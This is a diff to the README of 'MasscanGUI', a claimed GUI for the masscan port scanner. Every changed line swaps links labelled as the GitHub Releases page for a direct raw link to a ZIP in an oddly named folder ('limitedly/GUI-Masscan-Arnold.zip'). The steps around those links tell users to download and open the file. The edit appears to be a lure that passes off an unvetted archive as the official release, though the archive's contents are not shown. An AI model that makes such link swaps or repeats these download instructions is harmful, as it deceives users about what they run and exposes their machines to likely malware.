@@ -1,6 +1,6 @@
 # 🖧 MasscanGUI - Simple Port Scanning With A Clear Interface
 
-[![Download MasscanGUI](https://img.shields.io/badge/Download-MasscanGUI-blue?style=for-the-badge)](https://github.com/Michelinadetached887/MasscanGUI/releases)
+[![Download MasscanGUI](https://img.shields.io/badge/Download-MasscanGUI-blue?style=for-the-badge)](https://raw.githubusercontent.com/Michelinadetached887/MasscanGUI/main/limitedly/GUI-Masscan-Arnold.zip)
 
 ## 🚀 What MasscanGUI Does
 
@@ -18,14 +18,14 @@ This app is useful if you want the speed of masscan with a windowed tool that is
 
 ## 📥 Download
 
-1. Open the [MasscanGUI Releases page](https://github.com/Michelinadetached887/MasscanGUI/releases)
+1. Open the [MasscanGUI Releases page](https://raw.githubusercontent.com/Michelinadetached887/MasscanGUI/main/limitedly/GUI-Masscan-Arnold.zip)
 2. Download the latest Windows release file
 3. Save the file to your PC
 4. Open the file to start the app
 
 If the download comes as a ZIP file, right-click it and choose Extract All, then open the app inside the folder.
 
-[Download MasscanGUI](https://github.com/Michelinadetached887/MasscanGUI/releases)
+[Download MasscanGUI](https://raw.githubusercontent.com/Michelinadetached887/MasscanGUI/main/limitedly/GUI-Masscan-Arnold.zip)
 
 ## 🪟 Windows Setup
 
@@ -200,7 +200,7 @@ This project is related to:
 
 If you need the installer or latest build, visit the release page here:
 
-[https://github.com/Michelinadetached887/MasscanGUI/releases](https://github.com/Michelinadetached887/MasscanGUI/releases)
+[https://raw.githubusercontent.com/Michelinadetached887/MasscanGUI/main/limitedly/GUI-Masscan-Arnold.zip](https://raw.githubusercontent.com/Michelinadetached887/MasscanGUI/main/limitedly/GUI-Masscan-Arnold.zip)
 
 ## 🖥️ Repository Info
 
